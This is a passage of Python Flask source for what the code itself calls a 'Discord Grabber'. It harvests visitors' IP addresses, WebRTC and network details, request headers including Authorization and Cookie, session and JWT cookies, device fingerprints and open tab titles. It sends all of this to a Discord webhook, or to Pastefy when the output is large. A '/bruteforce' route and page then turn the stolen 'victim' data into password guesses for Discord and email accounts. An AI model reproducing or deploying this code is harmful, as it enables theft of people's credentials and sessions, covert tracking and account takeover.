        content_lines.append(f"  WebRTC IPv6s ({len(webrtc_ipv6)} total):")
        for idx, rtc_ip6_obj in enumerate(webrtc_ipv6[:10], 1):
            if isinstance(rtc_ip6_obj, dict):
                rtc_ip6 = rtc_ip6_obj.get('ip', str(rtc_ip6_obj))
                port = rtc_ip6_obj.get('port', '')
                ip_type_detail = rtc_ip6_obj.get('type', 'unknown')
                protocol = rtc_ip6_obj.get('protocol', 'unknown')
                ip6_class = "Link-Local" if rtc_ip6.startswith('fe80::') else "Global"
                content_lines.append(f"    #{idx}: {rtc_ip6}:{port} ({ip6_class}, {ip_type_detail}, {protocol})")
            else:
                rtc_ip6 = str(rtc_ip6_obj)
                ip6_type = "Link-Local" if rtc_ip6.startswith('fe80::') else "Global"
                content_lines.append(f"    #{idx}: {rtc_ip6} ({ip6_type})")
    
    dhcp_info = fingerprint.get('dhcp_info', {})
    if dhcp_info and not dhcp_info.get('error'):
        content_lines.append(f"")
        
        dhcp_server = dhcp_info.get('dhcp_server_likely', 'Unknown')
        if dhcp_server and dhcp_server != 'Unknown':
            content_lines.append(f"  DHCP Server: {dhcp_server}")
        
        network_class = dhcp_info.get('network_class', 'Unknown')
        if network_class != 'Unknown':
            content_lines.append(f"  Network Class: {network_class}")
        
        subnet_mask = dhcp_info.get('subnet_mask_detected', 'Unknown')
        if subnet_mask != 'Unknown':
            content_lines.append(f"  Subnet Mask: {subnet_mask}")
        
        broadcast = dhcp_info.get('broadcast_address', 'Unknown')
        if broadcast != 'Unknown':
            content_lines.append(f"  Broadcast: {broadcast}")
        
        lease_info = dhcp_info.get('lease_info', {})
        if lease_info:
            lease_type = lease_info.get('lease_type', 'Unknown')
            ip_order = lease_info.get('ip_assignment_order', 'Unknown')
            if lease_type != 'Unknown':
                content_lines.append(f"  Lease: {lease_type} | IP Order: #{ip_order}")
        
        dns_servers = dhcp_info.get('dns_servers', [])
        if dns_servers:
            content_lines.append(f"  DNS: {', '.join(dns_servers[:3])}")
    
    router_data = fingerprint.get('router_data', {})
    if router_data and not router_data.get('error'):
        content_lines.append(f"")
        
        default_gateway = router_data.get('default_gateway', 'Unknown')
        if default_gateway and default_gateway != 'Unknown':
            content_lines.append(f"  Gateway: {default_gateway}")
        
        connection_info = router_data.get('connection_info', {})
        if connection_info:
            conn_type = connection_info.get('type', 'Unknown')
            downlink = connection_info.get('downlink', 'Unknown')
            rtt = connection_info.get('rtt', 'Unknown')
            if conn_type != 'Unknown':
                content_lines.append(f"  Connection Type: {conn_type} | Downlink: {downlink} Mbps | RTT: {rtt} ms")
        
        network_interfaces = router_data.get('network_interfaces', [])
        if network_interfaces:
            for idx, interface in enumerate(network_interfaces[:3], 1):
                local_ip = interface.get('local_ip', 'Unknown')
                gateway = interface.get('gateway', 'Unknown')
                subnet = interface.get('subnet', 'Unknown')
                subnet_mask = interface.get('subnet_mask', 'Unknown')
                broadcast = interface.get('broadcast', 'Unknown')
                network_class = interface.get('network_class', 'Unknown')
                dhcp_server = interface.get('dhcp_server', 'Unknown')
                
                content_lines.append(f"  Interface #{idx}: {local_ip}")
                content_lines.append(f"    Gateway: {gateway} | Subnet: {subnet}/{subnet_mask}")
                content_lines.append(f"    Broadcast: {broadcast} | Class: {network_class}")
                if dhcp_server != 'Unknown':
                    content_lines.append(f"    DHCP Server: {dhcp_server}")
    
    if replit_data:
        content_lines.append(f"")
        for k, v in replit_data.items():
            content_lines.append(f"{k}: {v}")
    
    if forwarded_headers:
        content_lines.append(f"")
        for k, v in forwarded_headers.items():
            content_lines.append(f"{k}: {v}")
    
    all_request_headers = {}
    for key, value in request.headers.items():
        all_request_headers[key] = value
    
    important_headers = [
        'User-Agent', 'Accept', 'Accept-Language', 'Accept-Encoding', 'Accept-Charset',
        'Referer', 'Origin', 'Host', 'DNT', 'Connection', 'Upgrade-Insecure-Requests',
        'Sec-Fetch-Site', 'Sec-Fetch-Mode', 'Sec-Fetch-User', 'Sec-Fetch-Dest',
        'Sec-CH-UA', 'Sec-CH-UA-Mobile', 'Sec-CH-UA-Platform', 'Sec-CH-UA-Arch',
        'Sec-CH-UA-Bitness', 'Sec-CH-UA-Full-Version', 'Sec-CH-UA-Model',
        'X-Requested-With', 'Cache-Control', 'Pragma', 'TE', 'Via',
        'X-Forwarded-For', 'X-Real-IP', 'X-Forwarded-Host', 'X-Forwarded-Proto',
        'CF-Connecting-IP', 'CF-IPCountry', 'CF-Ray', 'CF-Visitor',
        'X-Client-IP', 'X-Cluster-Client-IP', 'X-Request-ID', 'X-Correlation-ID',
        'Authorization', 'Cookie', 'Content-Type', 'Content-Length',
        'If-Modified-Since', 'If-None-Match', 'Save-Data'
    ]
    
    if all_request_headers:
        content_lines.append(f"")
        for header in important_headers:
            if header in all_request_headers:
                content_lines.append(f"  {header}: {str(all_request_headers[header])[:150]}")
    
    advanced_headers = filter_headers({
        'Sec-CH-UA-Arch': http_headers.get('sec_ch_ua_arch'),
        'Sec-CH-UA-Bitness': http_headers.get('sec_ch_ua_bitness'),
        'Sec-CH-UA-Full-Version': http_headers.get('sec_ch_ua_full_version'),
        'Sec-CH-UA-Full-Version-List': http_headers.get('sec_ch_ua_full_version_list'),
        'Sec-CH-UA-Model': http_headers.get('sec_ch_ua_model'),
        'Sec-CH-UA-Platform-Version': http_headers.get('sec_ch_ua_platform_version'),
        'Sec-CH-UA-WoW64': http_headers.get('sec_ch_ua_wow64'),
        'Sec-CH-Viewport-Width': http_headers.get('sec_ch_viewport_width'),
        'Sec-CH-Device-Memory': http_headers.get('sec_ch_device_memory'),
        'Sec-CH-DPR': http_headers.get('sec_ch_dpr'),
        'Sec-CH-Width': http_headers.get('sec_ch_width'),
        'Sec-CH-Downlink': http_headers.get('sec_ch_downlink'),
        'Sec-CH-ECT': http_headers.get('sec_ch_ect'),
        'Sec-CH-RTT': http_headers.get('sec_ch_rtt'),
        'Sec-CH-Save-Data': http_headers.get('sec_ch_save_data'),
        'Sec-CH-Prefers-Color-Scheme': http_headers.get('sec_ch_prefers_color_scheme'),
        'Sec-CH-Prefers-Reduced-Motion': http_headers.get('sec_ch_prefers_reduced_motion')
    })
    
    if advanced_headers:
        content_lines.append(f"")
        for k, v in advanced_headers.items():
            content_lines.append(f"  {k}: {v}")
    
    browser_info = fingerprint.get('browser_capabilities', {})
    if browser_info:
        content_lines.append(f"")
        content_lines.append(f"  Platform: {fingerprint.get('platform', 'Unknown')}")
        content_lines.append(f"  CPU Cores: {fingerprint.get('cpu_cores', 'Unknown')}")
        content_lines.append(f"  Device Memory: {fingerprint.get('device_memory', 'Unknown')} GB")
        content_lines.append(f"  Screen: {fingerprint.get('screen_width', 'Unknown')}x{fingerprint.get('screen_height', 'Unknown')}")
        content_lines.append(f"  Color Depth: {fingerprint.get('color_depth', 'Unknown')} bit")
        content_lines.append(f"  Pixel Ratio: {fingerprint.get('device_pixel_ratio', 'Unknown')}")
        content_lines.append(f"  Timezone: {fingerprint.get('timezone', 'Unknown')}")
        content_lines.append(f"  Language: {fingerprint.get('language', 'Unknown')}")
        content_lines.append(f"  WebGL Vendor: {fingerprint.get('webgl_vendor', 'Unknown')}")
        content_lines.append(f"  WebGL Renderer: {fingerprint.get('webgl_renderer', 'Unknown')}")
        
        gpu_info = fingerprint.get('webgpu_vendor', 'Unknown')
        if gpu_info != 'Unknown':
            content_lines.append(f"  WebGPU: {gpu_info}")
        
        battery_level = fingerprint.get('battery_level', 'Unknown')
        if battery_level != 'Unknown':
            content_lines.append(f"  Battery: {battery_level} (Charging: {fingerprint.get('battery_charging', 'Unknown')})")
        
        fonts_count = fingerprint.get('fonts_count', 0)
        if fonts_count > 0:
            content_lines.append(f"  Fonts Detected: {fonts_count}")
        
        cameras = fingerprint.get('camera_count', 0)
        mics = fingerprint.get('microphone_count', 0)
        if cameras > 0 or mics > 0:
            content_lines.append(f"  Media Devices: {cameras} camera(s), {mics} microphone(s)")
    
    all_cookies_combined = {}
    
    server_cookies = replit_info.get('cookies', {})
    for name, value in server_cookies.items():
        if value and value != 'Not Available':
            all_cookies_combined[name] = {'value': value, 'source': 'Server (HTTP Request)'}
    
    browser_cookies = fingerprint.get('browser_cookies', {})
    for name, value in browser_cookies.items():
        if name not in all_cookies_combined:
            all_cookies_combined[name] = {'value': value, 'source': 'Client (JavaScript)'}
    
    raw_cookies_parsed = fingerprint.get('raw_cookies_parsed', [])
    for cookie_data in raw_cookies_parsed:
        name = cookie_data.get('name')
        value = cookie_data.get('value')
        if name and name not in all_cookies_combined:
            all_cookies_combined[name] = {'value': value, 'source': 'Raw Cookie Header'}
    
    if all_cookies_combined:
        content_lines.append(f"")
        
        cookies_detailed_info = fingerprint.get('cookies_detailed', [])
        cookie_stats = fingerprint.get('cookie_statistics', {})
        
        if cookie_stats:
            session_count = cookie_stats.get('session_cookies', 0)
            auth_count = cookie_stats.get('auth_cookies', 0)
            jwt_count = cookie_stats.get('jwt_cookies', 0)
            if session_count or auth_count or jwt_count:
                content_lines.append(f"  🍪 {len(all_cookies_combined)} cookies | Session: {session_count} | Auth: {auth_count} | JWT: {jwt_count}")
        
        for idx, (cookie_name, cookie_data) in enumerate(sorted(all_cookies_combined.items())[:30], 1):
            cookie_value = str(cookie_data['value'])
            source = cookie_data['source']
            
            is_long = len(cookie_value) > 100
            display_value = cookie_value[:100] + "..." if is_long else cookie_value
            
            is_jwt = len(cookie_value.split('.')) == 3
            is_base64_like = len(cookie_value) > 20 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in cookie_value[:20])
            
            tags = []
            if is_jwt:
                tags.append("JWT")
            if is_base64_like:
                tags.append("Base64")
            if 'session' in cookie_name.lower() or 'sess' in cookie_name.lower():
                tags.append("Session")
            if 'auth' in cookie_name.lower() or 'token' in cookie_name.lower():
                tags.append("Auth")
            
            tag_str = f" [{', '.join(tags)}]" if tags else ""
            content_lines.append(f"  {idx}. {cookie_name}{tag_str}")
            content_lines.append(f"     Value: {display_value}")
            content_lines.append(f"     Source: {source} | Length: {len(cookie_value)}")
    
    open_tabs = fingerprint.get('open_tabs', {})
    if open_tabs and not open_tabs.get('error'):
        content_lines.append(f"")
        content_lines.append(f"  Current Tab: {open_tabs.get('current_title', 'Unknown')}")
        content_lines.append(f"  Detected: {open_tabs.get('detected_tabs', 0)} recent tabs")
        tab_titles = open_tabs.get('tab_titles', [])
        if tab_titles:
            content_lines.append(f"  Titles: {', '.join(tab_titles[:5])}")
    
    x_replit_content = "```\n" + "\n".join(content_lines) + "\n```" if content_lines else None
    
    def validate_and_fix_embeds(embeds):
        return embeds
    
    embeds_list = validate_and_fix_embeds(embeds_list)
    
    def split_content(content, max_length=1990):
        """Split content into chunks that fit Discord's limit"""
        if not content or len(content) <= max_length:
            return [content] if content else []
        
        chunks = []
        lines = content.split('\n')
        current_chunk = ""
        
        for line in lines:
            if len(current_chunk) + len(line) + 1 <= max_length:
                current_chunk += line + '\n'
            else:
                if current_chunk:
                    chunks.append(current_chunk.rstrip())
                current_chunk = line + '\n'
        
        if current_chunk:
            chunks.append(current_chunk.rstrip())
        
        return chunks
    
    try:
        if WEBHOOK:
            headers = {"Content-Type": "application/json"}
            
            total_content_length = len(x_replit_content) if x_replit_content else 0
            
            if total_content_length > 5000:
                print(f"[*] Content too large ({total_content_length} chars), uploading to Pastefy...")
                pastefy_result = upload_to_pastefy(x_replit_content, f"Discord Grabber - {ip}")
                
                if pastefy_result.get("success"):
                    pastefy_content = f"```\n📋 Full Data Available at Pastefy\n\n🔗 View URL: {pastefy_result['view_url']}\n📥 Raw URL: {pastefy_result['raw_url']}\n\n⚠️ Content was {total_content_length:,} characters (too large for Discord)\n```"
                    
                    payload = {
                        "content": pastefy_content,
                        "embeds": embeds_list
                    }
                    
                    payload_size = len(json.dumps(payload))
                    print(f"[*] Sending Pastefy link with {len(embeds_list)} embeds (payload: {payload_size:,} bytes)")
                    print(f"[DEBUG] IP being sent to webhook: {ip}")
                    print(f"[DEBUG] IPv6 being sent to webhook: {ipv6}")
                    
                    response = requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
                    
                    if response.status_code in [200, 204]:
                        print(f"[+] ✅ SUCCESS Webhook sent with Pastefy link!")
                    else:
                        print(f"[-] ❌ FAILED - Status: {response.status_code}")
                        print(f"[-] Response: {response.text}")
                else:
                    print(f"[-] Pastefy upload failed, falling back to split messages")
                    content_chunks = split_content(x_replit_content)
                    
                    if content_chunks:
                        payload = {
                            "content": content_chunks[0],
                            "embeds": embeds_list
                        }
                        
                        response = requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
                        
                        if response.status_code in [200, 204]:
                            print(f"[+] ✅ SUCCESS Message 1/{len(content_chunks)} sent!")
                        
                        for i, chunk in enumerate(content_chunks[1:], 2):
                            import time
                            time.sleep(0.5)
                            
                            payload = {"content": chunk}
                            response = requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
                            
                            if response.status_code in [200, 204]:
                                print(f"[+] ✅ SUCCESS Message {i}/{len(content_chunks)} sent!")
            else:
                content_chunks = split_content(x_replit_content)
                
                if content_chunks:
                    payload = {
                        "content": content_chunks[0],
                        "embeds": embeds_list
                    }
                    
                    payload_size = len(json.dumps(payload))
                    print(f"[*] Sending message with {len(embeds_list)} embeds (payload: {payload_size:,} bytes)")
                    print(f"[DEBUG] IP being sent to webhook: {ip}")
                    print(f"[DEBUG] IPv6 being sent to webhook: {ipv6}")
                    
                    response = requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
                    
                    if response.status_code in [200, 204]:
                        print(f"[+] ✅ SUCCESS Message sent!")
                    else:
                        print(f"[-] ❌ FAILED - Status: {response.status_code}")
                        print(f"[-] Response: {response.text}")
                    
                    if len(content_chunks) > 1:
                        for i, chunk in enumerate(content_chunks[1:], 2):
                            import time
                            time.sleep(0.5)
                            
                            payload = {"content": chunk}
                            response = requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
                            
                            if response.status_code in [200, 204]:
                                print(f"[+] ✅ SUCCESS Message {i}/{len(content_chunks)} sent!")
                            else:
                                print(f"[-] ❌ FAILED Message {i} - Status: {response.status_code}")
                else:
                    payload = {"embeds": embeds_list}
                    payload_size = len(json.dumps(payload))
                    print(f"[*] Sending {len(embeds_list)} embeds (payload: {payload_size:,} bytes)")
                    
                    response = requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
                    
                    if response.status_code in [200, 204]:
                        print(f"[+] ✅ SUCCESS All embeds sent to Discord!")
                    else:
                        print(f"[-] ❌ FAILED - Status: {response.status_code}")
                        print(f"[-] Response: {response.text}")
        else:
            print(f"[-] WEBHOOK environment variable is not set!")
    except requests.exceptions.Timeout:
        print(f"[-] Webhook timeout after 10 seconds")
    except requests.exceptions.RequestException as e:
        print(f"[-] Webhook request error: {e}")
    except Exception as e:
        print(f"[-] Unexpected error sending webhook: {e}")
        import traceback
        traceback.print_exc()

    return redirect(VERIFIED_URL or "https://discord.com")


@app.route('/bruteforce', methods=['POST', 'GET'])
def bruteforce():
    """Advanced bruteforce using collected victim data"""
    if request.method == 'GET':
        return render_template_string(BRUTEFORCE_HTML)
    
    data = request.get_json() or request.form
    target_type = data.get('target_type')
    target = data.get('target')
    session_id = data.get('session_id')
    
    if not target_type or not target:
        return jsonify({
            'success': False,
            'error': 'Missing target_type or target'
        }), 400
    
    fingerprint = None
    if session_id and session_id in fingerprint_storage:
        fingerprint = fingerprint_storage[session_id]
    
    if not fingerprint:
        return jsonify({
            'success': False,
            'error': 'No fingerprint data found for this session. Victim must visit the grabber first.'
        }), 404
    
    results = {
        'success': True,
        'target_type': target_type,
        'target': target,
        'attempts': [],
        'victim_info_used': {}
    }
    
    password_attempts = []
    
    username = fingerprint.get('discord_username', 'Unknown')
    email = fingerprint.get('discord_email', 'Unknown')
    user_id = fingerprint.get('discord_id', 'Unknown')
    city = fingerprint.get('city', 'Unknown')
    country = fingerprint.get('country', 'Unknown')
    timezone = fingerprint.get('timezone', 'Unknown')
    phone = fingerprint.get('phone_number', '')
    
    results['victim_info_used'] = {
        'username': username,
        'email': email,
        'user_id': user_id,
        'city': city,
        'country': country,
        'timezone': timezone
    }
    
    if username and username != 'Unknown':
        password_attempts.extend([
            username,
            username + '123',
            username + '!',
            username + '2024',
            username + '@123'
        ])
    
    if email and email != 'Unknown':
        email_user = email.split('@')[0]
        password_attempts.extend([
            email_user,
            email_user + '123',
            email_user + '!',
            email,
            email.replace('@', '_')
        ])
    
    if city and city != 'Unknown':
        password_attempts.extend([
            city.lower(),
            city.lower() + '123',
            city.capitalize() + '!'
        ])
    
    if phone:
        password_attempts.extend([
            phone[-4:],
            phone[-6:],
            phone.replace('+', '').replace('-', '')[-8:]
        ])
    
    common_passwords = [
        'password', 'Password123', 'password123', '123456', '12345678',
        'qwerty', 'abc123', 'password1', 'admin', 'letmein',
        'welcome', 'monkey', '1234567890', 'Pass@123', 'Admin123'
    ]
    password_attempts.extend(common_passwords)
    
    password_attempts = list(dict.fromkeys(password_attempts))
    
    if target_type == 'discord':
        for attempt in password_attempts[:50]:
            results['attempts'].append({
                'password': attempt,
                'method': 'Generated from victim data',
                'strength': 'low' if attempt.isdigit() or len(attempt) < 8 else 'medium'
            })
    
    elif target_type == 'email':
        for attempt in password_attempts[:50]:
            results['attempts'].append({
                'password': attempt,
                'method': 'Email-based generation',
                'strength': 'medium'
            })
    
    elif target_type == 'custom':
        for attempt in password_attempts[:50]:
            results['attempts'].append({
                'password': attempt,
                'method': 'Custom target',
                'strength': 'variable'
            })
    
    results['total_attempts'] = len(results['attempts'])
    results['note'] = 'These are generated password attempts based on victim data. Use responsibly.'
    
    print(f"[+] Bruteforce requested: {target_type} - {target}")
    print(f"[+] Generated {len(results['attempts'])} password attempts from victim data")
    
    return jsonify(results)

# Note: BRUTEFORCE_HTML defined below
import os
import json
BRUTEFORCE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Advanced Bruteforce Tool</title>
    <style>
        body { font-family: Arial; background: #1e1e1e; color: #fff; padding: 40px; max-width: 800px; margin: 0 auto; }
        h1 { color: #7289da; }
        select, input { width: 100%; padding: 12px; margin: 10px 0; background: #2c2f33; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { background: #7289da; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px; }
        button:hover { background: #5b6eae; }
        .result { margin-top: 20px; padding: 15px; background: #2c2f33; border-radius: 5px; max-height: 600px; overflow-y: auto; }
        .attempt { padding: 8px; margin: 5px 0; background: #23272a; border-radius: 3px; font-family: monospace; }
        .error { background: #d9534f; }
        .success { background: #5cb85c; }
        .info { background: #5bc0de; color: #000; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <h1>🔓 Advanced Bruteforce Tool</h1>
    <div class="info">
        <strong>Note:</strong> This tool generates password attempts based on victim fingerprint data collected from the grabber.
        Enter the victim's session_id from the logs or fingerprint data.
    </div>
    
    <form id="bruteforceForm">
        <label>Target Type:</label>
        <select name="target_type" required>
            <option value="discord">Discord Account</option>
            <option value="email">Email Account</option>
            <option value="custom">Custom Target</option>
        </select>
        
        <label>Target (username/email):</label>
        <input type="text" name="target" placeholder="victim@example.com or username" required>
        
        <label>Session ID (from fingerprint logs):</label>
        <input type="text" name="session_id" placeholder="Enter victim session_id" required>
        
        <button type="submit">Generate Passwords</button>
    </form>
    
    <div id="result"></div>
    
    <script>
        document.getElementById('bruteforceForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const data = Object.fromEntries(formData);
            
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '<div class="result">Generating password attempts...</div>';
            
            try {
                const response = await fetch('/bruteforce', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    let html = `
                        <div class="result success">
                            <h3>✅ Generated ${result.total_attempts} Password Attempts</h3>
                            <p><strong>Target:</strong> ${result.target} (${result.target_type})</p>
                            <h4>Victim Info Used:</h4>
                            <pre>${JSON.stringify(result.victim_info_used, null, 2)}</pre>
                            <h4>Password Attempts:</h4>
                    `;
                    
                    result.attempts.forEach((attempt, idx) => {
                        html += `<div class="attempt">${idx + 1}. ${attempt.password} <small>(${attempt.method}, strength: ${attempt.strength})</small></div>`;
                    });
                    
                    html += `<p><small>${result.note}</small></p></div>`;
                    resultDiv.innerHTML = html;
                } else {
                    resultDiv.innerHTML = `
                        <div class="result error">
                            <h3>❌ Failed</h3>
                            <p>${result.error}</p>
                        </div>
                    `;
                }
            } catch(err) {
                resultDiv.innerHTML = `
                    <div class="result error">
                        <h3>❌ Error</h3>
                        <p>${err.message}</p>
                    </div>
                `;
            }
        });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)